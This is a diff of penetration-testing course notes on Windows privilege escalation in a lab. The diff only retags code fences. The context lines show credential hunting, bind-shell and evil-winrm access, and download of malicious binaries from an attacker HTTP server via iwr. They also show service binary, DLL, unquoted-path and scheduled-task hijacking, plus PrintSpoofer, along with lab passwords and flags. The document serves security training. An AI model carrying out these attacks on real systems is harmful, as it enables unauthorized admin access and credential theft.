@@ -197,7 +197,7 @@ The key info we should always obtain:
 - Once we have performed enumeration and obtained this information we will have a solid understanding of our target sys.
 
 Let's start info gathering on the CLIENTWK220 sys.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ export VM1='192.168.211.220'                              
                                                                                          
@@ -329,7 +329,7 @@ Users                               Users are prevented from making accidental o
 
 - As an example review the members of `adminteam` and `Administrators`
  - Cmdlet: `Get-LocalGroupMember` with group name as arg.
-```
+```powershell
 PS C:\Users\dave> Get-LocalGroupMember adminteam
 Get-LocalGroupMember adminteam
 
@@ -366,7 +366,7 @@ To summarize what we now know:
 
 Next, we gather info about the target sys itself, its configuration, and apps running on it.
 - Check OS, version, arch: `systeminfo`
-```
+```powershell
 PS C:\Users\dave> systeminfo
 systeminfo
 
@@ -420,7 +420,7 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 Next, we will review the network info we can obtain as `dave`.  Our goal is to identify all network ifaces, routes, and active network connections.  This info may allow us to identify new services or even access to other networks.  It may not lead directly to elevated privs, but vital to understand machines purpose and to obtain vectors to other systems/networks.
 *Obtaining privileged access on every machine in a penetration test is rarely a useful or realistic goal. While most machines in the challenge labs of this course are rootable, we'll face numerous non-rootable machines in real-life assessments. A skilled penetration tester's goal is therefore not to blindly attempt privilege escalation on every machine at any cost, but to identify machines where privileged access leads to further compromise of the client's infrastructure.*
 - List all iface: `ipconfig /all`
-```
+```powershell
 PS C:\Users\dave> ipconfig /all
 ipconfig /all
 
@@ -456,7 +456,7 @@ Ethernet adapter Ethernet0:
  - Subnet mask.
  - MAC address.
 - Display routing table: `route print`
-```
+```powershell
 PS C:\Users\dave> route print
 route print
 ===========================================================================
@@ -505,7 +505,7 @@ Persistent Routes:
 - List active TCP/UDP connections, disable name resolution: `netstat -ano`
  - Active TCP and TCP/UDP ports `-a`
  - Show the process ID for each conn `-o`
-```
+```powershell
 PS C:\Users\dave> netstat -ano
 netstat -ano
 
@@ -587,7 +587,7 @@ Active Connections
 Next, we check all installed applications by querying two regi keys, listing both 32-bit and 64-bit applications in the Win Registry with `Get-ItemProperty`.  Pipe the output to `select` with arg `displayname` to only show the application names.
 - 32-bit applications: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
 - 64-bit applications: `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
-```
+```powershell
 PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displaynameGet-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
 
@@ -632,7 +632,7 @@ Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913
 
 It is equally important to determine which apps are currently running.
 - Show running procs: `Get-Process`
-```
+```powershell
 PS C:\Users\dave> Get-Process
 Get-Process
 
@@ -717,7 +717,7 @@ OS{118aabd36b321e3300f7523ea481608c}
 
 
 We'll now use an additional machine, CLIENTWK221 (VM #2), to practice what we learned in this section. Access the machine via RDP as user mac with the password IAmTheGOATSysAdmin!. Identify another member of the local Administrators group apart from offsec and Administrator.
-```
+```powershell
 PS C:\Users\mac> Get-Process
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -914,7 +914,7 @@ We will search CLIENTWK220 for SI (sensitive info)
 - To form our search command `Get-ChildItem`
  - Arg `-Path` enter `C:\`
  - Arg `-Include` enter `*.kdbx`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ nc $VM1 4444                          
 Microsoft Windows [Version 10.0.22000.795]
@@ -937,7 +937,7 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
   - Set options.
 			- `-Include *.txt,*.ini`
 			- `-Path C:\xampp`
-```
+```powershell
 PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 
@@ -1556,7 +1556,7 @@ Mode                 LastWriteTime         Length Name
  - Set options.
 		- `-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx`
 		- `-Path C:\Users\dave\`
-```
+```powershell
 PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
@@ -1570,7 +1570,7 @@ Mode                 LastWriteTime         Length Name
 ```
 - We found a text file on the desktop of the user.
 - Let's check the contents.
-```
+```powershell
 PS C:\Users\dave> cat C:\Users\dave\Desktop\asdf.txt
 cat C:\Users\dave\Desktop\asdf.txt
 notes from meeting:
@@ -1588,7 +1588,7 @@ password is: securityIsNotAnOption++++++
  - For testing, "Steve's" password is `securityIsNotAnOption++++++`
   - Info gathered in situational awareness told us that `steve` exists on the target sys.
   - Before attempting to leverage password check the groups `steve` is a member of.
-```
+```powershell
 PS C:\Users\dave> net user steve
 net user steve
 User name                    steve
@@ -1627,7 +1627,7 @@ The command completed successfully.
 
 - As `dave` we did not have privs to access `C:\xampp\mysql\bin\my.ini`
  - Let's check if we have access as `steve`
-```
+```powershell
 PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
 # Example MySQL config file for small systems.
 ...
@@ -1643,7 +1643,7 @@ socket="C:/xampp/mysql/mysql.sock"
  - It contains the manually set password `admin123admin123!`
   - We also find a comment that this is the Win password for `backupadmin`
    - Review the groups of `backupadmin`
-```
+```powershell
 PS C:\Users\steve> net user backupadmin
 User name                    BackupAdmin
 ...
@@ -1669,7 +1669,7 @@ The command completed successfully.
  - Enter username as arg for `/user`
  - Followed by the command to execute.
  - A password prompt will appear and we can enter the password we found previously.
-```
+```powershell
 PS C:\Users\steve> runas /user:backupadmin cmd
 Enter the password for backupadmin:
 Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
@@ -1682,7 +1682,7 @@ PS C:\Users\steve>
 ###### Exercises
 
 Log into the system CLIENTWK220 (VM #1) via RDP as user steve. Search the file system to find login credentials for a web page for the user steve and enter the password as answer to this exercise.
-```
+```powershell
 PS C:\Users\steve> Get-ChildItem -Path C:\Users\steve\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
 
@@ -1702,7 +1702,7 @@ pass: thisIsWhatYouAreLookingFor
 ```
 
 Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin! and locate sensitive information on the system to elevate your privileges. Once found, use the credentials to access the system as this user and find the flag on the Desktop.
-```
+```powershell
 PS C:\Users\mac> history
 
   Id CommandLine
@@ -1821,7 +1821,7 @@ This has led to less sensitive info stored in notes and text files.  Due to grow
 We will demonstrate how to retrieve info recorded by PS with the help of the enabled logging mechanisms and PS history.  We'll connect to a bind shell on port 4444 running as user `dave` and launch `powershell`.
 
 Before checking if Script Block Logging or PowerShell Transcription is enabled we should check the PS history of the user.  This can be done with `Get-History`.
-```
+```powershell
 C:\Users\dave>powershell
 powershell
 Windows PowerShell
@@ -1838,13 +1838,13 @@ Most admins us `Clear-History` to clear the PS history, this only clears PS's ow
 
 Interestingly `Clear-History` does not clear the command history recorded by `PSReadline`.  To get the `PSReadline` history we can use `Get-PSReadlineOption` to obtain info from the module.
 - To get the one option `(Get-PSReadlineOption).HistorySavePath`
-```
+```powershell
 PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
 (Get-PSReadlineOption).HistorySavePath
 C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 - This is the path of the history file which we can display with `type`
-```
+```powershell
 PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 whoami
@@ -1885,7 +1885,7 @@ Stop-Transcript
       - *PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.*.
 		- Now let's look at the transcript file save to `C:\Users\Public\Transcripts\transcript01.txt` to see if we can glean more info on the user and password in use.
    - Since PowerShell Transcription stared before `Enter-PSSession` we might find plain text creds used to create the PSCredential object stored to `$cred`
-```
+```powershell
 PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
 type C:\Users\Public\Transcripts\transcript01.txt
 **********************
@@ -1921,7 +1921,7 @@ End time: 20220623081221
  - Fist user creates a [SecureString](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring)
   - To store the password.
  - The variable, containing the object, can pass as arg to `-Credential` in commands like `Enter-PSSession`
-```
+```powershell
 PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
 $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
 
@@ -1957,7 +1957,7 @@ dir
  - Target username for arg `-u`
  - Target password for arg `-p`
   - Escape the `!`s in the password with `\`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ evil-winrm -i $VM1 -u daveadmin -p "qwertqwertqwert123\!\!"
                                         
@@ -2034,7 +2034,7 @@ ThereIsNoSecretCowLevel1337
 ```
 
 Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin!. Enumerate the machine and use the methods from this section to find credentials. Utilize them and find the flag.
-```
+```powershell
 PS C:\Users\mac> Get-History
 PS C:\Users\mac> (Get-PSReadlineOption).HistorySavePath
 C:\Users\mac\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -2057,7 +2057,7 @@ Previously we manually enumerated CLIENTWK220, gathering info, which led us to t
 			- [JAWS](https://github.com/411Hall/JAWS)
  - Install package `peass`
  - Copy the 64-bit binary to our working dir and start with Python3.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ mkdir winpeas          
                                                                                          
@@ -2077,7 +2077,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   - To move the tool onto the machine.
 			- `iwr`
     - Arg `-uri` attacking machine Python3 HTTP server winPEAS.exe.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ nc $VM1 4444
 Microsoft Windows [Version 10.0.22000.795]
@@ -2096,7 +2096,7 @@ iwr -uri http://192.168.45.195/winPEASx64.exe -Outfile winPEAS.exe
 - Run `winPEAS.exe`
  - Red items merit deeper inspection.
  - Important info about protections green.
-```
+```powershell
 C:\Users\dave> .\winPEAS.exe
 ...
 +] Legend:
@@ -2213,7 +2213,7 @@ Every Win service has an associated binary file that is exec when the service st
 		-  use `Select` with args `Name`, `State`, and `PathName`
 		-  filter out service not in `Running` state with `Where-Object`
 *When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.*
-```
+```powershell
 PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
 Name                          State   PathName
@@ -2342,7 +2342,7 @@ WpnUserService_697796         Running C:\Windows\system32\svchost.exe -k Unistac
     - R:Read-only access.
     - W:Write-only access.
 - Use `icacls` on Apache fin `httpd.exe` first.
-```
+```powershell
 PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
 C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                               NT AUTHORITY\SYSTEM:(F)
@@ -2354,7 +2354,7 @@ Successfully processed 1 files; Failed processing 0 files
 - As a member of built-in `Users` group, `dave` only has `Read and Execute (RX)` rights on `httpd.exe`
  - We cannot replace the file with a mal binary.
 - Next, we'll check `mysqld.exe` from the mysql service.
-```
+```powershell
 PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
 C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
                               NT AUTHORITY\SYSTEM:(F)
@@ -2388,7 +2388,7 @@ int main ()
 - Next we'll cross-compile with mingw-64.
 	- 64-bit application with `x86_64-w64-mingw32-gcc`
   - Arg `-o` as `adduser.exe`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/priv-esc]
 └─$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
@@ -2397,7 +2397,7 @@ int main ()
  - Use `iwr` on target PS to download the exe.
  - Move the og `mysqld.exe` to our home dir.
   - So it can be restored after successful priv esc attempt.
-```
+```powershell
 PS C:\Users\dave> iwr -uri http://192.168.45.195/adduser.exe -Outfile adduser.exe                  
 
 PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
@@ -2406,7 +2406,7 @@ PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 ```
 - To exec the bin through the service, we need to restart it.
  - Use `net stop` to start the service.
-```
+```powershell
 PS C:\Users\dave> net stop mysql
 System error 5 has occurred.
 
@@ -2420,7 +2420,7 @@ Access is denied.
 		- Cmdlet `Get-MimInstance`
    - Select `Name` and `StartMode`
    - Filter for string "mysql" with `Where-Object`
-```
+```powershell
 PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
 
 Name  StartMode
@@ -2431,7 +2431,7 @@ mysql Auto
  - It will restart after Reboot.
  - To do so the user needs priv `SeShutDownPrivilege`
   - User `whoami /priv` to list privs.
-```
+```powershell
 PS C:\Users\dave> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -2452,13 +2452,13 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 - If `SeShutdownPrivilege` was not present, we would have to wait for target to manually restart.
 - We can issue a reboot with `shutdown` and the `/r` and `/t 0`
 *We should always try to avoid issuing reboots on production systems in a real-life penetration test. A reboot could lead to unforeseeable problems and should only be issued in direct collaboration with the client's IT staff. If a system doesn't boot up after we reboot, this could disrupt our client's day-to-day business and even cause long-term downtime of the infrastructure. This is especially the case in a situation when there is no current backup available.*
-```
+```powershell
 PS C:\Users\dave> shutdown /r /t 0 
 ```
 - After reboot is complete, connect again via `dave`
 - Post reboot the system should have exec the mal exe we replaced the og mysql service bin with.
 - To confirm, list members of the local Administrators group with `Get-LocalGroupMember`
-```
+```powershell
 PS C:\Users\dave> Get-LocalGroupMember Administrators
 
 ObjectClass Name                      PrincipalSource
@@ -2475,7 +2475,7 @@ User        CLIENTWK220\offsec        Local
 - To restore og file we have to del our mal bin and move restore the backed up mysql.exe then restart the sys.
 
 Before concluding the section we will review an automated tool names `PowerUp.ps1` to see if it detects the PrivEsc vector.  Copy it to our working dir.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/priv-esc]
 └─$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
                                                                                          
@@ -2488,7 +2488,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  - Start `powershell` with `ExecutionPolicy Bypass`
 - After importing `PowerUp.ps1` we can use `Get-ModifiableServiceFile`
  - Which will display services the user can modify.
-```
+```powershell
 PS C:\Users\dave> iwr -uri http://192.168.45.195/PowerUp.ps1 -Outfile PowerUp.ps1                  PS C:\Users\dave> ls
 
 
@@ -2602,7 +2602,7 @@ Name                            : mysql
   - Added to local Administrators group.
  - Because we lack perms, we will need to restart the machine.
 - If we use AbuseFunction `Install-ServiceBinary` we receive an error.
-```
+```powershell
 PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
 Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql'
 for service mysql not modifiable by the current user.
@@ -2619,7 +2619,7 @@ At C:\Users\dave\PowerUp.ps1:2845 char:13
 	- If we review the code of PowerUp and check the outputs of commands used in `Get-ModifiableServiceFile` we see that `Get-ModifiablePath` is used to return modifiable paths for the current user.
   - For us it provides an empty result returning the error.
   - Let's examine this to understand why the error occurs.
-```
+```powershell
 PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
 PS C:\Users\dave> $ModifiableFiles
 
@@ -2724,7 +2724,7 @@ OS{0194ca6d87f9cc2321b6c966d4da4a90}
 
 
 Connect to CLIENTWK221 (VM #2) via RDP as user milena with the password MyBirthDayIsInJuly1!. Find a service in which milena can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.
-```
+```powershell
 PS C:\Users\milena> iwr -uri http://192.168.45.195/PowerUp.ps1 -Outfile PowerUp.ps1
 PS C:\Users\milena> powershell -ep bypass
 Windows PowerShell
@@ -2837,7 +2837,7 @@ There are several ways to exploit how DLLs work on Win which can be effective fo
  - Connect to CLIENTWK220 via RDP.
  - User `steve`
  - Pass `securityIsNotAnOption++++++`
-```
+```powershell
 PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
 Name                   State   PathName
@@ -2850,7 +2850,7 @@ Audiosrv               Running C:\Windows\System32\svchost.exe -k LocalServiceNe
 BetaService            Running C:\Users\steve\Documents\BetaServ.exe
 ```
 - Check our perms for `BetaService`
-```
+```powershell
 PS C:\Users\steve> icacls .\Documents\BetaServ.exe
 .\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
                          BUILTIN\Administrators:(F)
@@ -2888,7 +2888,7 @@ PS C:\Users\steve> icacls .\Documents\BetaServ.exe
  - From PowerShell.
   - Enter `Restart-Service` with `BetaService` as arg.
    - With Process Monitor running in background.
-```
+```powershell
 PS C:\Users\steve> Restart-Service BetaService
 WARNING: Waiting for service 'BetaService (BetaService)' to start...
 ```
@@ -2899,7 +2899,7 @@ WARNING: Waiting for service 'BetaService (BetaService)' to start...
    - The CreateFile func can be used to create or open a file.
   - We see the service bin tries to locate a file called `myDLL.dll` but fails.
 ![41dc8d5f1f72178ed78a9cb9a35b0ef2.png](../_resources/41dc8d5f1f72178ed78a9cb9a35b0ef2.png)
-```
+```powershell
 PS C:\Users\steve> $env:path
 C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
 ```
@@ -2978,14 +2978,14 @@ LPVOID lpReserved ) // Reserved
 ```
 - Next we cross compile with mingw.
  - We use the same command as previously but add `--shared` to specify we are building a DLL.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/priv-esc]
 └─$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
 ```
 - Once compiled we can transfer it to CLIENTWK220.
  - Before downloading we change dir to `Documents` on our target sys.
  - We also confirm that `dave2` does not already exist with `net user`
-```
+```powershell
 PS C:\Users\steve\Documents> iwr -uri http://192.168.45.195/myDLL.dll -Outfile myDLL.dll
 PS C:\Users\steve\Documents> ls .\myDLL.dll
 
@@ -3012,7 +3012,7 @@ offsec                   steve                    WDAGUtilityAccount
 - After restarting BetaService.
  - Our DLL will load.
  - Code to create `dave2` as local Admin in DLL_PROCESS_ATTACH should exec.
-```
+```powershell
 PS C:\Users\steve\Documents> Restart-Service BetaService
 WARNING: Waiting for service 'BetaService (BetaService)' to start...
 PS C:\Users\steve\Documents> net user
@@ -3102,7 +3102,7 @@ When a service is started and a proc is created:
    - The func starts interpreting the path from left to right until a space is reached.
    - At each space in the path the func uses the preceding part as the file name by adding `.exe` and the rest as args.
 				- Example:
-```
+```powershell
 C:\Program.exe
 C:\Program Files\My.exe
 C:\Program Files\My Program\My.exe
@@ -3129,7 +3129,7 @@ Now that we have a basic understanding of this vuln, let's use it in an example.
  - Password `securityIsNotAnOption++++++`
  - Via RDP.
 - Open PowerShell and enum running/stopped services.
-```
+```powershell
 PS C:\Users\steve> Get-CimInstance -CLassName win32_service | Select Name,State,PathName
 
 Name                                      State   PathName
@@ -3156,7 +3156,7 @@ GammaService                              Stopped C:\Program Files\Enterprise Ap
    - To print only matches without quotes.
 - Use `cmd.exe` instead of PowerShell to avoid escaping issue of the quote in the second `findstr` command.
  - Alternatively we could use [Select-String](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2) in PowerShell.
-```
+```powershell
 PS C:\Users\steve> cmd
 Microsoft Windows [Version 10.0.22000.795]
 (c) Microsoft Corporation. All rights reserved.
@@ -3174,7 +3174,7 @@ NetSetupSvc
 - Before continuing check if we can start/stop the service as `steve`
 	- `Start-Service`
 	- `Stop-Service`
-```
+```powershell
 PS C:\Users\steve> Start-Service GammaService
 WARNING: Waiting for service 'GammaService (GammaService)' to start...
 PS C:\Users\steve> Start-Service GammaService
@@ -3182,14 +3182,14 @@ PS C:\Users\steve> Start-Service GammaService
 - We find that `steve` has perms to start/stop the service.
  - We don't need to issue a reboot to restart the service.
 - Next list the paths Win uses to locate the exec file of the service.
-```
+```powershell
 C:\Program.exe
 C:\Program Files\Enterprise.exe
 C:\Program Files\Enterprise Apps\Current.exe
 C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
 ```
 - Check our rights on these paths with `icacls`
-```
+```powershell
 PS C:\Users\steve> icacls "C:\"
 C:\ BUILTIN\Administrators:(OI)(CI)(F)
     NT AUTHORITY\SYSTEM:(OI)(CI)(F)
@@ -3217,7 +3217,7 @@ Successfully processed 1 files; Failed processing 0 files
 - Our user `steve` is a member of BUILTIN\Users and NT AUTHORITY\AUTHENTICATED Users and has no Write perms in either of these paths.
 - No check the path of the third option.
  - We skip the fourth path since it is the service bin itself.
-```
+```powershell
 PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
 C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                  NT AUTHORITY\SYSTEM:(OI)(CI)(F)
@@ -3233,7 +3233,7 @@ Successfully processed 1 files; Failed processing 0 files
  - We want to place our mal file named `Current.exe` in path `C:\Program Files\Enterprise Apps\`
 - We can reuse the `adduser.exe`
  - Transfer to target sys.
-```
+```powershell
 PS C:\Users\steve> iwr -uri http://192.168.45.195/adduser.exe -Outfile Current.exe
 PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
 ```
@@ -3241,7 +3241,7 @@ PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.
  - This will exec `Current.exe` instead of `GammaServ.exe`
  - Run `Start-Service` with arg `GammaService`
 - We can then use `net user` to check if `dave2` was added to local Administrators group.
-```
+```powershell
 PS C:\Users\steve> Start-Service GammaService
 Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following
 error: Cannot start service GammaService on computer '.'.
@@ -3277,7 +3277,7 @@ Let's see if PowerUp identifies this vuln.
 - Transfer `PowerUp.ps1` to target.
 - Import to PowerShell session.
 - Set ExecutionPolicy to Bypass and use Get-UnquotedService.
-```
+```powershell
 PS C:\Users\steve> iwr -uri http://192.168.45.195/PowerUp.ps1 -Outfile PowerUp.ps1
 PS C:\Users\steve> powershell -ep bypass
 Windows PowerShell
@@ -3330,7 +3330,7 @@ Name           : GammaService
  - Opt `-Path` we use the same path for `Current.exe`
   - Default behavior is to create a new local user `john` with password `Password123!`
   - Added user to local Administrator.
-```
+```powershell
 PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
 
 ServiceName  Path                                         Command
@@ -3365,7 +3365,7 @@ The command completed successfully.
 ###### Exercises
 
 Follow the steps from this section on CLIENTWK220 (VM #1) to exploit the unquoted service path of GammaService. Obtain code execution, an interactive shell, or access to the GUI as an administrative user and find the flag on the desktop of daveadmin.
-```
+```powershell
 PS C:\Users\steve> iwr -uri http://192.168.45.195/chpasswd.exe -Outfile chpasswd.exe
 PS C:\Users\steve> copy .\chpasswd.exe 'C:\Program Files\Enterprise Apps\Current.exe'
 PS C:\Users\steve> Start-Service GammaService
@@ -3595,7 +3595,7 @@ In this example we will attempt PrivEsc by replacing a binary specified by an ac
    - Run As User.
    - Next Run Time.
 - Large amount of output, pipe to more `| more`
-```
+```powershell
 PS C:\Users\steve> schtasks /query /fo LIST /v | more
 ...
 Folder: \Microsoft
@@ -3629,7 +3629,7 @@ Start Date:                           7/4/2022
  - Task runs as `daveadmin`
 - Since the exec is in the home `Pictures` dir of `steve` we should have perms.
  - Check file perms with `icacls`
-```
+```powershell
 PS C:\Users\steve> icacls .\Pictures\BackendCacheCleanup.exe
 .\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                    BUILTIN\Administrators:(I)(F)
@@ -3639,7 +3639,7 @@ PS C:\Users\steve> icacls .\Pictures\BackendCacheCleanup.exe
 - As expected we have full permissions `(F)`
  - We can use a mal binary, like `adduser.exe`, to replace the exe specified in the action of the scheduled task.
 - We can now transfer our mal via `iwr` and make a backup of original `BackendCacheCleanup.exe`
-```
+```powershell
 PS C:\Users\steve> iwr -uri http://192.168.45.195/adduser.exe -Outfile adduser.exe
 PS C:\Users\steve> copy .\Pictures\BackendCacheCleanup.exe .\BackendCacheCleanup.exe
 PS C:\Users\steve> ls .\BackendCacheCleanup.exe
@@ -3658,7 +3658,7 @@ PS C:\Users\steve> copy .\adduser.exe .\Pictures\BackendCacheCleanup.exe
 ```
 - Once the task executes again `dave2` should be created as local Administrator group memeber.
  - After one minute we check if our PrivEsc attack is successful .
-```
+```powershell
 PS C:\Users\steve> net user
 
 User accounts for \\CLIENTWK220
@@ -3695,7 +3695,7 @@ This vector is similar to "Service Binary Hijacking" vector, but it focuses on t
 ###### Exercises
 
 Follow the steps from this section on CLIENTWK220 (VM #1) to exploit the scheduled task CacheCleanup by replacing the binary specified as action. Obtain code execution, an interactive shell, or access to the GUI as administrative user and find the flag on the desktop of daveadmin.
-```
+```powershell
 PS C:\Users\steve> iwr -uri http://192.168.45.195/chpasswd.exe -Outfile chpasswd.exe
 PS C:\Users\steve> ls
 
@@ -3736,7 +3736,7 @@ OS{7eab8cb4961e087e84961c7332c1a78c}
 ```
 
 Connect to CLIENTWK221 (VM #2) via RDP as the user moss with the password work6potence6PLASMA6flint7. Enumerate the scheduled tasks on the system and find a way to obtain an interactive shell as user running the scheduled task. The flag can be found on the desktop.
-```
+```powershell
 C:\Users\moss>schtasks /query /fo LIST /v | more
 
 ...
@@ -3908,7 +3908,7 @@ Let's briefly discuss named pipes and how to leverage SeImpersonatePrinilege to 
  - Port `4444`
  - On CLIENTWK220.
 - Use `whoami /priv` to display privs of `dave`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/priv-esc]
 └─$ nc $VM1 4444
 Microsoft Windows [Version 10.0.22000.795]
@@ -3933,7 +3933,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 - We see `dave` has SeImpersonatePrivilege.
  - We can attempt PrivEsc using `PrintSpoofer`
 - Download and serve to tool to the target sys.
-```
+```bash
 kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
 ...
 2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
@@ -3942,7 +3942,7 @@ kali@kali:~$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 - From bind shell.
-```
+```powershell
 C:\Users\dave>powershell
 powershell
 Windows PowerShell
@@ -3956,7 +3956,7 @@ iwr -uri http://192.168.45.240/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 - To obtain an interactive PowerShell session in the context of NT AUTHORITY\SYSTEM with PrintSpoofer.exe.
  - Enter `powershell.exe` as arg for `-c`
  - Arg `-i` to interact with the proc in the current command prompt.
-```
+```powershell
 PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
 .\PrintSpoofer64.exe -i -c powershell.exe
 [+] Found privilege: SeImpersonatePrivilege
